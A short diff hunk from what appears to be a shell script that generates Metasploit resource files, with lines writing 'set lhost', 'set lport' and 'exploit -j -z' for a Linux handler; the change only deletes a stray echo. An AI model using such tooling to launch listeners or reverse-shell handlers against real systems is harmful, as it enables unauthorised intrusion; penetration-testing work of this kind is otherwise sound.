@@ -174,7 +174,7 @@ linuxrc()
 		echo "set lhost $llh" >>${lrc}.rc
 		echo "set lport $llp" >>${lrc}.rc
 		echo "exploit -j -z" >> ${lrc}.rc
-		echo 
+		
 }
 windowsrc()
 {  
